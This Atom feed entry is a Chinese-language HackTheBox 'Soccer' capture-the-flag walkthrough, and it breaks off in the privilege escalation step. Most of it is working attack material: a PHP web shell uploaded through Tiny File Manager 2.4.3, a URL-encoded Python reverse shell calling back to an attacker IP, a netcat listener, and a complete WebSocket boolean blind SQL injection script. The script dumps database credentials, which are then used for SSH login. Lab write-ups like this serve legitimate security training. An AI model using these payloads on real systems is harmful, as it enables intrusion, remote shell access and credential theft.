<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xXxYOLOxXx</title>
  
  <subtitle>xXxYOLOxXx</subtitle>
  <link href="https://yoloyolo.top/atom.xml" rel="self"/>
  
  <link href="https://yoloyolo.top/"/>
  <updated>2023-03-05T15:55:20.675Z</updated>
  <id>https://yoloyolo.top/</id>
  
  <author>
    <name>xXxYOLOxXx</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>HackTheBox_Soccer</title>
    <link href="https://yoloyolo.top/2023/03/05/HackTheBox-Soccer/"/>
    <id>https://yoloyolo.top/2023/03/05/HackTheBox-Soccer/</id>
    <published>2023-03-05T15:21:38.000Z</published>
    <updated>2023-03-05T15:55:20.675Z</updated>
    
    <content type="html"><![CDATA[<p>日常记录</p><a id="more"></a><h1 id="hackthebox_soccer"><a class="markdownIt-Anchor" href="#hackthebox_soccer"></a> HackTheBox_Soccer</h1><h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h2><h3 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -T5 -v 10.10.11.194</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.194</span><br><span class="line">Host is up (0.52s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE         VERSION</span><br><span class="line">22&#x2F;tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80&#x2F;tcp   open  http            nginx 1.18.0 (Ubuntu)</span><br><span class="line">9091&#x2F;tcp open  xmltec-xmlmail?</span><br><span class="line">1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :</span><br><span class="line">SF-Port9091-TCP:V&#x3D;7.70%I&#x3D;7%D&#x3D;3&#x2F;5%Time&#x3D;640459F7%P&#x3D;x86_64-pc-linux-gnu%r(inf</span><br><span class="line">SF:ormix,2F,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\</span><br><span class="line">SF:n\r\n&quot;)%r(drda,2F,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Request\r\nConnection:\x2</span><br><span class="line">SF:0close\r\n\r\n&quot;)%r(GetRequest,168,&quot;HTTP&#x2F;1\.1\x20404\x20Not\x20Found\r\n</span><br><span class="line">SF:Content-Security-Policy:\x20default-src\x20&#39;none&#39;\r\nX-Content-Type-Opt</span><br><span class="line">SF:ions:\x20nosniff\r\nContent-Type:\x20text&#x2F;html;\x20charset&#x3D;utf-8\r\nCon</span><br><span class="line">SF:tent-Length:\x20139\r\nDate:\x20Sun,\x2005\x20Mar\x202023\x2008:52:25\x</span><br><span class="line">SF:20GMT\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang&#x3D;</span><br><span class="line">SF:\&quot;en\&quot;&gt;\n&lt;head&gt;\n&lt;meta\x20charset&#x3D;\&quot;utf-8\&quot;&gt;\n&lt;title&gt;Error&lt;&#x2F;title&gt;\n&lt;&#x2F;h</span><br><span class="line">SF:ead&gt;\n&lt;body&gt;\n&lt;pre&gt;Cannot\x20GET\x20&#x2F;&lt;&#x2F;pre&gt;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n&quot;)%r(HTT</span><br><span class="line">SF:POptions,16C,&quot;HTTP&#x2F;1\.1\x20404\x20Not\x20Found\r\nContent-Security-Poli</span><br><span class="line">SF:cy:\x20default-src\x20&#39;none&#39;\r\nX-Content-Type-Options:\x20nosniff\r\nC</span><br><span class="line">SF:ontent-Type:\x20text&#x2F;html;\x20charset&#x3D;utf-8\r\nContent-Length:\x20143\r</span><br><span class="line">SF:\nDate:\x20Sun,\x2005\x20Mar\x202023\x2008:52:25\x20GMT\r\nConnection:\</span><br><span class="line">SF:x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang&#x3D;\&quot;en\&quot;&gt;\n&lt;head&gt;\n&lt;met</span><br><span class="line">SF:a\x20charset&#x3D;\&quot;utf-8\&quot;&gt;\n&lt;title&gt;Error&lt;&#x2F;title&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n&lt;pre&gt;Ca</span><br><span class="line">SF:nnot\x20OPTIONS\x20&#x2F;&lt;&#x2F;pre&gt;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n&quot;)%r(RTSPRequest,16C,&quot;HTT</span><br><span class="line">SF:P&#x2F;1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20default-sr</span><br><span class="line">SF:c\x20&#39;none&#39;\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x20t</span><br><span class="line">SF:ext&#x2F;html;\x20charset&#x3D;utf-8\r\nContent-Length:\x20143\r\nDate:\x20Sun,\x</span><br><span class="line">SF:2005\x20Mar\x202023\x2008:52:26\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;</span><br><span class="line">SF:!DOCTYPE\x20html&gt;\n&lt;html\x20lang&#x3D;\&quot;en\&quot;&gt;\n&lt;head&gt;\n&lt;meta\x20charset&#x3D;\&quot;ut</span><br><span class="line">SF:f-8\&quot;&gt;\n&lt;title&gt;Error&lt;&#x2F;title&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n&lt;pre&gt;Cannot\x20OPTIONS\x</span><br><span class="line">SF:20&#x2F;&lt;&#x2F;pre&gt;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n&quot;)%r(RPCCheck,2F,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\</span><br><span class="line">SF:x20Request\r\nConnection:\x20close\r\n\r\n&quot;)%r(DNSVersionBindReqTCP,2F,</span><br><span class="line">SF:&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n&quot;)%r</span><br><span class="line">SF:(DNSStatusRequestTCP,2F,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Request\r\nConnecti</span><br><span class="line">SF:on:\x20close\r\n\r\n&quot;)%r(Help,2F,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Request\r\</span><br><span class="line">SF:nConnection:\x20close\r\n\r\n&quot;)%r(SSLSessionReq,2F,&quot;HTTP&#x2F;1\.1\x20400\x2</span><br><span class="line">SF:0Bad\x20Request\r\nConnection:\x20close\r\n\r\n&quot;);</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h3 id="路径枚举"><a class="markdownIt-Anchor" href="#路径枚举"></a> 路径枚举</h3><p>请求WEB页面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -I 10.10.11.194</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Server: nginx&#x2F;1.18.0 (Ubuntu)</span><br><span class="line">Date: Sun, 05 Mar 2023 08:54:10 GMT</span><br><span class="line">Content-Type: text&#x2F;html</span><br><span class="line">Content-Length: 178</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Location: http:&#x2F;&#x2F;soccer.htb&#x2F;</span><br></pre></td></tr></table></figure><p>跳转至域名<code>soccer.htb</code></p><p>添加域名解析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;10.10.11.194\tsoccer.htb&#x27;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>枚举路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://soccer.htb/ /usr/share/wordlists/SecLists-master/Discovery/Web-Content/SVNDigger/all-dirs.txt -w</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;soccer.htb&#x2F;tiny&#x2F;</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a></p></blockquote><h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2><p>访问页面<code>http://soccer.htb/tiny/</code></p><p>源代码中存在以下内容</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://tinyfilemanager.github.io/&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">class</span>=<span class="string">&quot;text-muted&quot;</span> <span class="attr">data-version</span>=<span class="string">&quot;2.4.3&quot;</span>&gt;</span>CCP Programmers<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>即版本为2.4.3</p><p>相关EXP</p><blockquote><p><a href="https://github.com/febinrev/tinyfilemanager-2.4.3-exploit/blob/main/tiny_file_manager_exploit.py">https://github.com/febinrev/tinyfilemanager-2.4.3-exploit/blob/main/tiny_file_manager_exploit.py</a></p></blockquote><p>适当修改脚本后运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">datas&#x3D;&#123;&quot;p&quot;:&quot;tiny&#x2F;uploads&quot;, &quot;fullpath&quot;:&quot;&#x2F;BFL&#x2F;BFL.php&quot;&#125;</span><br><span class="line">files&#x3D;&#123;&quot;file&quot;:(&quot;exp.php&quot;,&quot;&lt;?php system($_REQUEST[&#39;BFL&#39;]); ?&gt;&quot;,&quot;application&#x2F;x-php&quot;)&#125;</span><br></pre></td></tr></table></figure><p>监听端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9998</span><br></pre></td></tr></table></figure><p>反弹Shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://soccer.htb/tiny/uploads/BFL/BFL.php?BFL=python3%20-c%20%22import%20os%2Csocket%2Csubprocess%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2710.10.16.30%27%2C9998%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%27/bin/bash%27%2C%27-i%27%5D%29%3B%22&#x27;</span></span><br></pre></td></tr></table></figure><p>获取TTY</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p>查看WEB站点配置信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/nginx/sites-enabled/default.htb</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">listen 80;</span><br><span class="line">listen [::]:80;</span><br><span class="line">server_name 0.0.0.0;</span><br><span class="line">return 301 http:&#x2F;&#x2F;soccer.htb$request_uri;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">listen 80;</span><br><span class="line">listen [::]:80;</span><br><span class="line"></span><br><span class="line">server_name soccer.htb;</span><br><span class="line"></span><br><span class="line">root &#x2F;var&#x2F;www&#x2F;html;</span><br><span class="line">index index.html tinyfilemanager.php;</span><br><span class="line"></span><br><span class="line">location &#x2F; &#123;</span><br><span class="line">try_files $uri $uri&#x2F; &#x3D;404;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location ~ \.php$ &#123;</span><br><span class="line">include snippets&#x2F;fastcgi-php.conf;</span><br><span class="line">fastcgi_pass unix:&#x2F;run&#x2F;php&#x2F;php7.4-fpm.sock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location ~ &#x2F;\.ht &#123;</span><br><span class="line">deny all;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/nginx/sites-enabled/soc-player.htb</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">listen 80;</span><br><span class="line">listen [::]:80;</span><br><span class="line"></span><br><span class="line">server_name soc-player.soccer.htb;</span><br><span class="line"></span><br><span class="line">root &#x2F;root&#x2F;app&#x2F;views;</span><br><span class="line"></span><br><span class="line">location &#x2F; &#123;</span><br><span class="line">proxy_pass http:&#x2F;&#x2F;localhost:3000;</span><br><span class="line">proxy_http_version 1.1;</span><br><span class="line">proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">proxy_set_header Connection &#39;upgrade&#39;;</span><br><span class="line">proxy_set_header Host $host;</span><br><span class="line">proxy_cache_bypass $http_upgrade;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到新域名<code>soc-player.soccer.htb</code></p><p>添加域名解析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.194\tsoc-player.soccer.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>访问域名<code>soc-player.soccer.htb</code></p><p>进行注册，登录</p><p>源代码中存在以下js脚本</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">&quot;ws://soc-player.soccer.htb:9091&quot;</span>);</span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> btn = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;btn&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> input = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line"></span><br><span class="line">ws.onopen = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;connected to the server&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">input.addEventListener(<span class="string">&#x27;keypress&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">keyOne(e)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">keyOne</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">e.stopPropagation();</span><br><span class="line"><span class="keyword">if</span> (e.keyCode === <span class="number">13</span>) &#123;</span><br><span class="line">e.preventDefault();</span><br><span class="line">sendText();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sendText</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> msg = input.value;</span><br><span class="line"><span class="keyword">if</span> (msg.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">ws.send(<span class="built_in">JSON</span>.stringify(&#123;</span><br><span class="line"><span class="string">&quot;id&quot;</span>: msg</span><br><span class="line">&#125;))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> append(<span class="string">&quot;????????&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ws.onmessage = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">append(e.data)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params">msg</span>) </span>&#123;</span><br><span class="line"><span class="keyword">let</span> p = <span class="built_in">document</span>.querySelector(<span class="string">&quot;p&quot;</span>);</span><br><span class="line"><span class="comment">// let randomColor = &#x27;#&#x27; + Math.floor(Math.random() * 16777215).toString(16);</span></span><br><span class="line"><span class="comment">// p.style.color = randomColor;</span></span><br><span class="line">p.textContent = msg</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本地console进行测试</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">&quot;ws://soc-player.soccer.htb:9091&quot;</span>);</span><br><span class="line">ws.onmessage = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;<span class="built_in">console</span>.log(e.data)&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ws.send(JSON.stringify(&#123;&quot;id&quot;: &quot;0&quot;&#125;));</span><br><span class="line">Ticket Doesn&#39;t Exist</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ws.send(JSON.stringify(&#123;&quot;id&quot;: &quot;0 or 1&quot;&#125;));</span><br><span class="line">Ticket Exists</span><br></pre></td></tr></table></figure><p>存在SQL注入漏洞</p><p>二分法布尔注入</p><blockquote><p>pip install websocket-client</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> websocket</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span>(<span class="params">ws, message</span>):</span></span><br><span class="line"><span class="keyword">global</span> result</span><br><span class="line">result = message  <span class="comment"># handle the received message here</span></span><br><span class="line">ws.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_error</span>(<span class="params">ws, error</span>):</span></span><br><span class="line">print(error)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_close</span>(<span class="params">ws</span>):</span></span><br><span class="line">print(<span class="string">&quot;Closed connection&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_open</span>(<span class="params">ws</span>):</span></span><br><span class="line"><span class="keyword">global</span> send_data</span><br><span class="line">ws.send(json.dumps(send_data))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>():</span></span><br><span class="line">websocket.enableTrace(<span class="literal">False</span>)  <span class="comment"># enable trace for debugging purposes</span></span><br><span class="line">ws = websocket.WebSocketApp(<span class="string">&quot;ws://soc-player.soccer.htb:9091&quot;</span>,</span><br><span class="line">on_message=on_message,</span><br><span class="line">on_error=on_error,</span><br><span class="line">on_close=on_close)</span><br><span class="line">ws.on_open = on_open</span><br><span class="line">ws.run_forever()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">version</span>():</span></span><br><span class="line">pos = <span class="number">1</span></span><br><span class="line">response = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">bot = <span class="number">0</span></span><br><span class="line">top = <span class="number">128</span></span><br><span class="line">mid = (bot + top) // <span class="number">2</span></span><br><span class="line"><span class="keyword">while</span>(bot &lt; top):</span><br><span class="line"><span class="keyword">global</span> send_data</span><br><span class="line">send_data = &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;59654 or ord(substr(@@version,%d,1))&gt;%d&quot;</span> % (pos, mid)&#125;</span><br><span class="line">print(send_data)</span><br><span class="line">run()</span><br><span class="line"><span class="keyword">if</span> result == <span class="string">&quot;Ticket Exists&quot;</span>:</span><br><span class="line">bot = mid + <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">top = mid</span><br><span class="line">mid = (bot + top) // <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span>(mid == <span class="number">0</span> <span class="keyword">or</span> mid == <span class="number">127</span>):</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">pos += <span class="number">1</span></span><br><span class="line">response = response + <span class="built_in">chr</span>(mid)</span><br><span class="line">print(response)</span><br><span class="line"><span class="keyword">if</span> mid == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">version()</span><br></pre></td></tr></table></figure><p>得到版本信息如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8.0.31-0ubuntu0.20.04.2</span><br></pre></td></tr></table></figure><p>查询用户信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send_data = &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;59654 or ord(substr((select user()),%d,1))&gt;%d&quot;</span> % (pos, mid)&#125;</span><br></pre></td></tr></table></figure><p>用户信息如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">player@localhost</span><br></pre></td></tr></table></figure><p>查询库名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send_data = &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;59654 or ord(substr((select group_concat(schema_name) from information_schema.schemata),%d,1))&gt;%d&quot;</span> % (pos, mid)&#125;</span><br></pre></td></tr></table></figure><p>库名如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql,information_schema,performance_scqema,sys,soccer_db</span><br></pre></td></tr></table></figure><p>查询user表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send_data = &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;59654 or ord(substr((select group_concat(user, &#x27;:&#x27; ,password) from mysql.user),%d,1))&gt;%d&quot;</span> % (pos, mid)&#125;</span><br></pre></td></tr></table></figure><p>user表如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debian-sys-maint:PlayerOftheMatch2022,mysql.infoschema:PlayerOftheMatch2022,mysql.session:PlayerOftheMatch2022,mysql.sys:PlayerOftheMatch2022,player:PlayerOftheMatch2022,root:PlayerOftheMatch2022</span><br></pre></td></tr></table></figure><p>SSH登入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh player@10.10.11.194</span><br><span class="line">PlayerOftheMatch2022</span><br></pre></td></tr></table></figure><p>查看user.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;home&#x2F;player&#x2F;user.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">71661caf8fd27d4777ef94f5ae4cfea5</span><br></pre></td></tr></table></figure><h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2><p>查询SUID文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;local&#x2F;bin&#x2F;doas</span><br></pre></td></tr></table></figure><p>查看doas配置信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/<span class="built_in">local</span>/etc/doas.conf </span><br><span class="line">permit nopass player as root cmd /usr/bin/dstat</span><br></pre></td></tr></table></figure><p><code>/usr/local/bin/doas</code>, <code>/usr/local/bin/vidoas</code><br />这两个程序都能给出配置信息的路径，前者需要IDA简略分析，后者运行即可得知</p><blockquote><p>There are some alternatives to the sudo binary such as doas for OpenBSD, remember to check its configuration at /etc/doas.conf – <a 